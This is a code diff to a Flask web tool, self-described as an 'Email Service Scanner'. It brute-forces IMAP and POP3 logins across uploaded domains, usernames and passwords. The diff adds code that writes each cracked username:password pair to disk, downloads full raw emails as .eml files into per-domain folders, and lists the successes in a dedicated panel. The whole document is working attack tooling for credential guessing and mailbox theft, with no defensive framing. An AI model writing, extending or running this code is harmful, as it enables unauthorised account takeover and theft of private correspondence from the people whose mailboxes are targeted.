@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 """
-Flask-based Email Service Scanner with Robust Progress Feedback
+Flask-based Email Service Scanner with Real-Time Progress & Disk Saving
 Minimalistic, terminal-like interface. Upload domains, usernames, and passwords.
 Tests all username-password combinations against IMAP/POP3 services.
-Displays real-time progress including per-credential attempts.
+On success: saves credentials and fetched messages to disk (under ./scans/<domain>/).
+Progress log limited to 200 lines; successes shown in a separate div.
 """
 
 import concurrent.futures
@@ -14,6 +15,7 @@ import time
 import json
 import threading
 import queue
+import os
 from flask import Flask, request, render_template_string, Response, jsonify
 from imaplib import IMAP4, IMAP4_SSL
 from poplib import POP3, POP3_SSL, error_proto as POPError
@@ -26,8 +28,9 @@ app.secret_key = 'insecure-dev-key-change-in-production'
 DEFAULT_TIMEOUT = 10
 DEFAULT_MAX_MSGS = 10
 DEFAULT_THREADS = 5
-PROGRESS_INTERVAL = 10  # Send an update every N credential attempts (lower for demo)
-HEARTBEAT_INTERVAL = 10  # Send heartbeat if no messages for 10 seconds
+PROGRESS_INTERVAL = 10          # Send an update every N credential attempts
+HEARTBEAT_INTERVAL = 10         # Send heartbeat if no messages for 10 seconds
+SCAN_OUTPUT = "scans"           # Base directory for saving successful results
 
 # IMAP: (port, use_ssl, use_starttls)
 IMAP_PORTS = [
@@ -54,11 +57,13 @@ def create_ssl_context(no_verify):
         context.verify_mode = ssl.CERT_NONE
     return context
 
-# ---------- IMAP Handling with Progress Callback ----------
+# ---------- IMAP Handling with Progress Callback and Disk Saving ----------
 def check_imap(domain, port, use_ssl, use_starttls, creds, timeout, max_msgs,
-               ssl_context, fetch_all, fetch_emails, progress_callback=None):
+               ssl_context, fetch_all, fetch_emails, output_dir, service_prefix,
+               progress_callback=None):
     """
     Attempt IMAP connection. Returns (success, summary_dict).
+    On success, saves credentials and messages to output_dir with service_prefix.
     Calls progress_callback(current, total) after each credential attempt.
     """
     conn = None
@@ -72,7 +77,7 @@ def check_imap(domain, port, use_ssl, use_starttls, creds, timeout, max_msgs,
         "mailboxes": [],
         "message_count": 0,
         "fetched": 0,
-        "messages": [],
+        "messages": [],        # keep small snippets for UI
         "error": None
     }
 
@@ -94,7 +99,15 @@ def check_imap(domain, port, use_ssl, use_starttls, creds, timeout, max_msgs,
             summary["success"] = True
             summary["credentials_used"] = f"{user}:{passwd}"
 
-            # Fetch capabilities
+            # Save credentials to disk
+            cred_file = os.path.join(output_dir, f"success_{service_prefix}.txt")
+            try:
+                with open(cred_file, 'w') as f:
+                    f.write(f"{user}:{passwd}\n")
+            except Exception as e:
+                logging.error(f"Failed to write credentials for {domain} {service_prefix}: {e}")
+
+            # Fetch capabilities (optional, not saved)
             try:
                 typ, data = conn.capability()
                 caps = safe_decode(data[0]).split()
@@ -146,12 +159,22 @@ def check_imap(domain, port, use_ssl, use_starttls, creds, timeout, max_msgs,
                     try:
                         typ, data = conn.fetch(str(i), "(RFC822)")
                         raw_email = data[0][1]
+
+                        # Save full message to disk
+                        msg_file = os.path.join(output_dir, f"{service_prefix}_msg_{i}.eml")
+                        try:
+                            with open(msg_file, 'wb') as f:
+                                f.write(raw_email)
+                        except Exception as e:
+                            logging.error(f"Failed to write message {i} for {domain}: {e}")
+
+                        # Keep snippet for UI
                         snippet = safe_decode(raw_email)[:200] + "..."
                         summary["messages"].append(f"Message {i}:\n{snippet}")
                         fetched += 1
                         time.sleep(0.2)
-                    except Exception:
-                        pass
+                    except Exception as e:
+                        logging.debug(f"Failed to fetch message {i}: {e}")
                 summary["fetched"] = fetched
 
             conn.close()
@@ -172,9 +195,10 @@ def check_imap(domain, port, use_ssl, use_starttls, creds, timeout, max_msgs,
         pass
     return False, summary
 
-# ---------- POP3 Handling with Progress Callback ----------
+# ---------- POP3 Handling with Progress Callback and Disk Saving ----------
 def check_pop3(domain, port, use_ssl, creds, timeout, max_msgs, ssl_context,
-               pop3_full, fetch_all, fetch_emails, progress_callback=None):
+               pop3_full, fetch_all, fetch_emails, output_dir, service_prefix,
+               progress_callback=None):
     conn = None
     summary = {
         "port": port,
@@ -206,6 +230,14 @@ def check_pop3(domain, port, use_ssl, creds, timeout, max_msgs, ssl_context,
             summary["success"] = True
             summary["credentials_used"] = f"{user}:{passwd}"
 
+            # Save credentials to disk
+            cred_file = os.path.join(output_dir, f"success_{service_prefix}.txt")
+            try:
+                with open(cred_file, 'w') as f:
+                    f.write(f"{user}:{passwd}\n")
+            except Exception as e:
+                logging.error(f"Failed to write credentials for {domain} {service_prefix}: {e}")
+
             msg_count, total_size = conn.stat()
             summary["message_count"] = msg_count
             summary["total_size"] = total_size
@@ -218,16 +250,27 @@ def check_pop3(domain, port, use_ssl, creds, timeout, max_msgs, ssl_context,
                         if pop3_full:
                             lines = conn.retr(i)[1]
                             msg_content = "\n".join(safe_decode(l) for l in lines)
-                            snippet = msg_content[:200] + "..."
+                            raw_bytes = "\n".join(l.decode('latin1') if isinstance(l, bytes) else l for l in lines).encode('utf-8', errors='ignore')
                         else:
                             lines = conn.top(i, 0)[1]
                             msg_header = "\n".join(safe_decode(l) for l in lines)
-                            snippet = msg_header[:200] + "..."
+                            raw_bytes = msg_header.encode('utf-8', errors='ignore')
+
+                        # Save full message to disk
+                        msg_file = os.path.join(output_dir, f"{service_prefix}_msg_{i}.eml")
+                        try:
+                            with open(msg_file, 'wb') as f:
+                                f.write(raw_bytes)
+                        except Exception as e:
+                            logging.error(f"Failed to write message {i} for {domain}: {e}")
+
+                        # Keep snippet for UI
+                        snippet = (msg_content if pop3_full else msg_header)[:200] + "..."
                         summary["messages"].append(f"Message {i}:\n{snippet}")
                         fetched += 1
                         time.sleep(0.2)
-                    except Exception:
-                        pass
+                    except Exception as e:
+                        logging.debug(f"Failed to fetch message {i}: {e}")
                 summary["fetched"] = fetched
 
             conn.quit()
@@ -261,6 +304,10 @@ def scan_domain_thread(domain, creds, timeout, max_msgs, no_ssl_verify,
         "services": []
     }
 
+    # Prepare output directory for this domain (will be created only if success occurs)
+    base_out = os.path.join(SCAN_OUTPUT, domain)
+    os.makedirs(base_out, exist_ok=True)  # will exist even if no success, but we keep it
+
     # Helper to queue progress messages
     def progress_callback(current, total, service, domain):
         msg_queue.put({
@@ -273,9 +320,11 @@ def scan_domain_thread(domain, creds, timeout, max_msgs, no_ssl_verify,
 
     # IMAP checks
     for port, use_ssl, use_starttls in IMAP_PORTS:
+        service_prefix = f"imap_{port}"
         success, svc_summary = check_imap(
             domain, port, use_ssl, use_starttls,
             creds, timeout, max_msgs, ssl_context, fetch_all, fetch_emails,
+            base_out, service_prefix,
             progress_callback=progress_callback
         )
         svc_summary["domain"] = domain
@@ -287,14 +336,17 @@ def scan_domain_thread(domain, creds, timeout, max_msgs, no_ssl_verify,
                 "service": f"IMAP/{port} ({svc_summary['encryption']})",
                 "credentials": svc_summary['credentials_used'],
                 "msg_count": svc_summary['message_count'],
-                "fetched": svc_summary['fetched']
+                "fetched": svc_summary['fetched'],
+                "saved_to": os.path.join(base_out, service_prefix)  # indicate where files are saved
             })
 
     # POP3 checks
     for port, use_ssl in POP3_PORTS:
+        service_prefix = f"pop3_{port}"
         success, svc_summary = check_pop3(
             domain, port, use_ssl,
             creds, timeout, max_msgs, ssl_context, pop3_full, fetch_all, fetch_emails,
+            base_out, service_prefix,
             progress_callback=progress_callback
         )
         svc_summary["domain"] = domain
@@ -308,7 +360,8 @@ def scan_domain_thread(domain, creds, timeout, max_msgs, no_ssl_verify,
                 "credentials": svc_summary['credentials_used'],
                 "msg_count": svc_summary['message_count'],
                 "size_mb": round(total_size_mb, 2),
-                "fetched": svc_summary['fetched']
+                "fetched": svc_summary['fetched'],
+                "saved_to": os.path.join(base_out, service_prefix)
             })
 
     # Signal completion for this domain
@@ -433,10 +486,15 @@ INDEX_HTML = """
             overflow-y: auto;
             background-color: #111;
         }
-        #progress .info { color: #0f0; }
-        #progress .success { color: #0f0; font-weight: bold; }
-        #progress .heartbeat { color: #666; }
-        #progress .attempt { color: #aa0; }
+        #successes {
+            margin-top: 20px;
+            border: 1px solid #0f0;
+            padding: 10px;
+            max-height: 200px;
+            overflow-y: auto;
+            background-color: #111;
+        }
+        #successes .success-item { color: #0f0; }
         #results {
             margin-top: 20px;
         }
@@ -445,7 +503,7 @@ INDEX_HTML = """
 </head>
 <body>
     <h1>📧 EMAIL SERVICE SCANNER (IMAP/POP3)</h1>
-    <p>Upload username & password files. All combinations will be tested against each domain.</p>
+    <p>Upload username & password files. All combinations will be tested against each domain. Successful logins save credentials and messages to disk (./scans/&lt;domain&gt;/).</p>
     <form id="scanForm" enctype="multipart/form-data">
         <label>Domains (one per line):</label><br>
         <textarea name="domains" rows="6" cols="50" placeholder="example.com&#10;test.org"></textarea><br>
@@ -473,8 +531,13 @@ INDEX_HTML = """
     </form>
 
     <div id="progress" class="hidden">
-        <h2>📡 PROGRESS</h2>
+        <h2>📡 PROGRESS (last 200 lines)</h2>
         <pre id="log"></pre>
+    </div>
+
+    <div id="successes" class="hidden">
+        <h2>✅ SUCCESSES</h2>
+        <pre id="success-log"></pre>
     </div>
 
     <div id="results" class="hidden">
@@ -483,18 +546,35 @@ INDEX_HTML = """
     </div>
 
     <script>
+        // Limit progress log to 200 lines
+        const MAX_LOG_LINES = 200;
+        let logLines = [];
+
+        function addLogLine(line) {
+            logLines.push(line);
+            if (logLines.length > MAX_LOG_LINES) {
+                logLines.shift();
+            }
+            document.getElementById('log').textContent = logLines.join('\\n');
+        }
+
         document.getElementById('scanForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             const form = e.target;
             const formData = new FormData(form);
 
             const progressDiv = document.getElementById('progress');
+            const successesDiv = document.getElementById('successes');
             const logPre = document.getElementById('log');
+            const successPre = document.getElementById('success-log');
             const resultsDiv = document.getElementById('results');
             const resultsContent = document.getElementById('results-content');
             progressDiv.classList.remove('hidden');
+            successesDiv.classList.remove('hidden');
             resultsDiv.classList.add('hidden');
             logPre.textContent = '';
+            successPre.textContent = '';
+            logLines = [];
 
             try {
                 const response = await fetch('/scan/stream', {
@@ -518,39 +598,42 @@ INDEX_HTML = """
                         if (line.trim() === '') continue;
                         try {
                             const msg = JSON.parse(line);
-                            handleMessage(msg, logPre, domainResults, resultsContent, resultsDiv);
+                            handleMessage(msg, logPre, successPre, domainResults, resultsContent, resultsDiv);
                         } catch (err) {
-                            logPre.textContent += `\\n[CLIENT ERROR] Failed to parse: ${line}\\n`;
+                            addLogLine(`[CLIENT ERROR] Failed to parse: ${line}`);
                         }
                     }
                 }
             } catch (err) {
-                logPre.textContent += `\\n[NETWORK ERROR] ${err.message}\\n`;
+                addLogLine(`[NETWORK ERROR] ${err.message}`);
             }
         });
 
-        function handleMessage(msg, logPre, domainResults, resultsContent, resultsDiv) {
+        function handleMessage(msg, logPre, successPre, domainResults, resultsContent, resultsDiv) {
             if (msg.type === 'start') {
-                logPre.textContent += `[INFO] Starting scan of ${msg.total} domains...\\n`;
+                addLogLine(`[INFO] Starting scan of ${msg.total} domains...`);
             } else if (msg.type === 'domain_start') {
-                logPre.textContent += `\\n[INFO] Scanning ${msg.domain}...\\n`;
+                addLogLine(`\\n[INFO] Scanning ${msg.domain}...`);
             } else if (msg.type === 'attempt') {
-                // Show progress every PROGRESS_INTERVAL attempts
-                logPre.textContent += `[${msg.domain} ${msg.service}] testing credential ${msg.current}/${msg.total}\\n`;
+                addLogLine(`[${msg.domain} ${msg.service}] testing credential ${msg.current}/${msg.total}`);
             } else if (msg.type === 'success') {
+                // Add to progress log
                 let line = `[SUCCESS] ${msg.domain}: ${msg.service} - ${msg.credentials} - msgs: ${msg.msg_count}`;
                 if (msg.size_mb) line += ` (${msg.size_mb} MB)`;
-                line += ` (fetched ${msg.fetched})\\n`;
-                logPre.textContent += line;
+                line += ` (fetched ${msg.fetched})`;
+                addLogLine(line);
+
+                // Also append to successes div with saved location
+                let successLine = `${msg.domain} | ${msg.service} | ${msg.credentials} | msgs: ${msg.msg_count} | saved to: ${msg.saved_to}`;
+                successPre.textContent += successLine + '\\n';
             } else if (msg.type === 'heartbeat') {
-                // Optionally show heartbeat as a subtle indicator (commented out)
-                // logPre.textContent += '.';
+                // optionally ignore
             } else if (msg.type === 'domain_done') {
                 domainResults.push(msg.result);
             } else if (msg.type === 'error') {
-                logPre.textContent += `\\n[ERROR] ${msg.message}\\n`;
+                addLogLine(`\\n[ERROR] ${msg.message}`);
             } else if (msg.type === 'all_done') {
-                logPre.textContent += '\\n[INFO] Scan complete. Rendering results...\\n';
+                addLogLine('\\n[INFO] Scan complete. Rendering results...');
                 renderResults(domainResults, resultsContent);
                 resultsDiv.classList.remove('hidden');
             }
@@ -572,12 +655,15 @@ INDEX_HTML = """
                     if (svc.total_size) {
                         html += `Total size: ${(svc.total_size / 1024).toFixed(2)} KB<br>`;
                     }
+                    // Show a few snippets (max 5) to keep UI light
                     if (svc.messages && svc.messages.length) {
                         html += `<details><summary>📨 message snippets (${svc.messages.length})</summary>`;
-                        html += `<pre style="background:#222; padding:5px;">`;
-                        for (const m of svc.messages) {
+                        html += `<pre style="background:#222; padding:5px; max-height:200px; overflow-y:auto;">`;
+                        const limited = svc.messages.slice(0,5);
+                        for (const m of limited) {
                             html += escapeHtml(m) + '\\n\\n';
                         }
+                        if (svc.messages.length > 5) html += '... (more saved to disk)\\n';
                         html += `</pre></details>`;
                     }
                     html += `</div>`;
@@ -631,6 +717,9 @@ def scan_stream():
     pop3_full = 'pop3_full' in request.form
     no_ssl_verify = 'no_ssl_verify' in request.form
     fetch_emails = 'fetch_emails' in request.form
+
+    # Ensure base output directory exists
+    os.makedirs(SCAN_OUTPUT, exist_ok=True)
 
     # Return a streaming response using the inner generator
     return Response(
